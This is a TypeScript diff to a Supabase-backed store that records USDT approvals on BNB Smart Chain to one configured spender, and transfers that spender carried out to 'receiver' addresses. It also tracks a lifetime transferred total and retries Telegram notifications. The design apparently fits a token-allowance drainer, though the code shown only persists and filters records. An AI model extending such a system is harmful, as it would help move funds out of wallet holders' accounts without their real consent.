@@ -19,6 +19,10 @@ export type WalletRecord = {
   chainId?: string;
   currentBalance?: string;
   currentAllowance?: string;
+  rawCurrentBalance?: string;
+  rawCurrentAllowance?: string;
+  currentBalanceStatus?: string;
+  currentAllowanceStatus?: string;
   spender?: string;
   latestApprovalTxHash?: string;
   latestTransferTxHash?: string;
@@ -34,10 +38,21 @@ export type ApprovalRecord = {
   tokenDecimals: number;
   approvalAmount: string;
   rawApprovalAmount: string;
+  currentAllowance?: string;
+  rawCurrentAllowance?: string;
+  allowanceStatus?: string;
+  walletBalance?: string;
+  rawWalletBalance?: string;
+  balanceStatus?: string;
+  previousAllowance?: string;
+  rawPreviousAllowance?: string;
+  previousAllowanceStatus?: string;
+  revocationEligible?: boolean;
   network: string;
   chainId: string;
   blockNumber: number;
   blockTimestamp: string;
+  blockTimestampStatus?: "verified" | "unavailable";
   transactionHash: string;
   logIndex: number;
   eventType: "Approval";
@@ -61,10 +76,16 @@ export type TransferRecord = {
   transferAmount: string;
   rawTransferAmount: string;
   currentBalance?: string;
+  executionEventLogIndex?: number;
+  executionContract?: string;
+  executionEvidence?: "TransferExecuted";
+  executionMethod?: "executeToReceiver1" | "executeToReceiver2";
+  executionVerified?: boolean;
   network: string;
   chainId: string;
   blockNumber: number;
   blockTimestamp: string;
+  blockTimestampStatus?: "verified" | "unavailable";
   transactionHash: string;
   logIndex: number;
   eventType: "Transfer";
@@ -98,11 +119,12 @@ export type HistoryRecord = {
 };
 
 type SupabaseRow<T> = { id: string; record: T; created_at: string };
+type SupabaseRecordRow<T> = { record: T };
 
 const defaultMonitoringState: MonitoringState = {
   network: "BNB Smart Chain",
   chainId: 56,
-  contractAddress: "0x0000000000000000000000000000000000000000",
+  contractAddress: config.USDT_ADDRESS,
   eventType: "Approval+Transfer",
   lastProcessedBlock: 0,
   updatedAt: new Date(0).toISOString()
@@ -134,8 +156,8 @@ export class Store {
     ]);
     this.wallets = wallets;
     this.historyRecords = history;
-    this.approvalEvents = approvals;
-    this.transferEvents = transfers;
+    this.approvalEvents = approvals.filter((record) => this.isApprovalInScope(record));
+    this.transferEvents = transfers.filter((record) => this.isTransferInScope(record));
     this.monitoringStates = monitoringStates;
 
     const { data: lifetimeTransferredAmount, error } = await this.client
@@ -178,10 +200,89 @@ export class Store {
     return address.toLowerCase();
   }
 
-  listWallets() { return this.wallets; }
-  listApprovalLinkedWallets() { return this.wallets.filter((wallet) => wallet.approvalLinked && wallet.active); }
+  private isApprovalInScope(record: ApprovalRecord) {
+    return record.eventType === "Approval" &&
+      record.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
+      record.spender?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
+      record.chainId === String(config.CHAIN_ID);
+  }
+
+  private isTransferInScope(record: TransferRecord) {
+    return record.eventType === "Transfer" &&
+      record.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
+      record.chainId === String(config.CHAIN_ID) &&
+      record.executionContract?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
+      record.executionVerified === true &&
+      ((record.executionMethod === "executeToReceiver1" || record.executionMethod === "executeToReceiver2") ||
+        (record.executionEvidence === "TransferExecuted" && Number.isInteger(record.executionEventLogIndex)));
+  }
+
+  listWallets() {
+    const verifiedOwners = new Set(this.approvalEvents.map((approval) =>
+      (approval.walletAddress || approval.ownerAddress).toLowerCase()
+    ));
+    return this.wallets.filter((wallet) => verifiedOwners.has(wallet.address.toLowerCase()));
+  }
+  hasVerifiedApprovalForWallet(address: string) {
+    const normalizedAddress = this.normalizeAddress(address);
+    return this.approvalEvents.some((approval) =>
+      this.normalizeAddress(approval.walletAddress || approval.ownerAddress) === normalizedAddress
+    );
+  }
+  listApprovalLinkedWallets() {
+    const latestApprovalByWallet = new Map<string, ApprovalRecord>();
+    for (const approval of this.approvalEvents) {
+      const owner = (approval.walletAddress || approval.ownerAddress).toLowerCase();
+      const existing = latestApprovalByWallet.get(owner);
+      if (
+        !existing ||
+        approval.blockNumber > existing.blockNumber ||
+        (approval.blockNumber === existing.blockNumber && approval.logIndex > existing.logIndex)
+      ) latestApprovalByWallet.set(owner, approval);
+    }
+    return this.wallets.filter((wallet) => {
+      const latestApproval = latestApprovalByWallet.get(wallet.address.toLowerCase());
+      return wallet.approvalLinked === true &&
+        wallet.active &&
+        wallet.tokenContract?.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
+        wallet.spender?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
+        wallet.chainId === String(config.CHAIN_ID) &&
+        latestApproval !== undefined &&
+        /^\d+$/.test(latestApproval.rawApprovalAmount) &&
+        BigInt(latestApproval.rawApprovalAmount) > 0n;
+    });
+  }
   listApprovalEvents() { return this.approvalEvents; }
   listTransferEvents() { return this.transferEvents; }
+  async listRetryableTelegramNotifications() {
+    const loadRetryable = async <T>(table: string): Promise<T[]> => {
+      const records: T[] = [];
+      const pageSize = 1000;
+      for (let offset = 0; ; offset += pageSize) {
+        const { data, error } = await this.client
+          .from(table)
+          .select("record")
+          .in("record->>telegramStatus", ["pending", "failed", "skipped"])
+          .order("created_at", { ascending: true })
+          .order("id", { ascending: true })
+          .range(offset, offset + pageSize - 1)
+          .returns<SupabaseRecordRow<T>[]>();
+        if (error) throw new Error(`Supabase retry scan failed for ${table}: ${error.message}`);
+        records.push(...data.map((row) => row.record));
+        if (data.length < pageSize) break;
+      }
+      return records;
+    };
+
+    const [approvals, transfers] = await Promise.all([
+      loadRetryable<ApprovalRecord>("approvalEvents"),
+      loadRetryable<TransferRecord>("transferEvents")
+    ]);
+    return {
+      approvals: approvals.filter((record) => this.isApprovalInScope(record)),
+      transfers: transfers.filter((record) => this.isTransferInScope(record))
+    };
+  }
   getLifetimeTransferredAmount() { return this.lifetimeTransferredAmount; }
   getLifetimeTransferredDecimals() { return this.lifetimeTransferredDecimals; }
   setLifetimeTransferredDecimals(decimals: number) {
@@ -195,8 +296,59 @@ export class Store {
   }
   getApprovalEvent(id: string) { return this.approvalEvents.find((record) => record.id === id); }
   getTransferEvent(id: string) { return this.transferEvents.find((record) => record.id === id); }
+  async findApprovalEvent(chainId: string, transactionHash: string, logIndex: number) {
+    const id = `approval-${chainId}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash.toLowerCase()}-${logIndex}`;
+    const cached = this.approvalEvents.find((record) => record.id === id);
+    if (cached) return cached;
+
+    const { data, error } = await this.client
+      .from("approvalEvents")
+      .select("record")
+      .eq("id", id)
+      .maybeSingle();
+    if (error) throw new Error(`Supabase event lookup failed for approval ${id}: ${error.message}`);
+    const record = data?.record as ApprovalRecord | undefined;
+    if (
+      !record ||
+      !this.isApprovalInScope(record) ||
+      record.chainId !== chainId ||
+      record.transactionHash.toLowerCase() !== transactionHash.toLowerCase() ||
+      record.logIndex !== logIndex
+    ) return undefined;
+    this.approvalEvents = [record, ...this.approvalEvents.filter((item) => item.id !== id)].slice(0, 2000);
+    return record;
+  }
+  async findTransferEvent(chainId: string, transactionHash: string, logIndex: number) {
+    const id = `transfer-${chainId}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash.toLowerCase()}-${logIndex}`;
+    const cached = this.transferEvents.find((record) => record.id === id);
+    if (cached) return cached;
+
+    const { data, error } = await this.client
+      .from("transferEvents")
+      .select("record")
+      .eq("id", id)
+      .maybeSingle();
+    if (error) throw new Error(`Supabase event lookup failed for transfer ${id}: ${error.message}`);
+    const record = data?.record as TransferRecord | undefined;
+    if (
+      !record ||
+      !this.isTransferInScope(record) ||
+      record.chainId !== chainId ||
+      record.transactionHash.toLowerCase() !== transactionHash.toLowerCase() ||
+      record.logIndex !== logIndex
+    ) return undefined;
+    this.transferEvents = [record, ...this.transferEvents.filter((item) => item.id !== id)].slice(0, 2000);
+    return record;
+  }
 
   async register(wallet: WalletRecord) {
+    if (wallet.approvalLinked && (
+      wallet.tokenContract?.toLowerCase() !== config.USDT_ADDRESS.toLowerCase() ||
+      wallet.spender?.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
+      wallet.chainId !== String(config.CHAIN_ID)
+    )) {
+      throw new Error("Cannot persist an approval-linked wallet outside the configured token, spender, and chain");
+    }
     await this.persist("wallets", this.normalizeAddress(wallet.address), wallet, wallet.createdAt);
     this.wallets = this.wallets.filter((item) => this.normalizeAddress(item.address) !== this.normalizeAddress(wallet.address));
     this.wallets.push(wallet);
@@ -256,12 +408,18 @@ export class Store {
   }
 
   async upsertApproval(record: ApprovalRecord) {
+    if (!this.isApprovalInScope(record)) {
+      throw new Error("Cannot persist an approval outside the configured token, spender, and chain");
+    }
     await this.persist("approvalEvents", record.id, record, record.createdAt);
     this.approvalEvents = [record, ...this.approvalEvents.filter((item) => item.id !== record.id)].slice(0, 2000);
     return record;
   }
 
   async upsertTransfer(record: TransferRecord) {
+    if (!this.isTransferInScope(record)) {
+      throw new Error("Cannot persist an unverified transfer outside the configured spender scope");
+    }
     await this.persist("transferEvents", record.id, record, record.createdAt);
     this.transferEvents = [record, ...this.transferEvents.filter((item) => item.id !== record.id)].slice(0, 2000);
     return record;
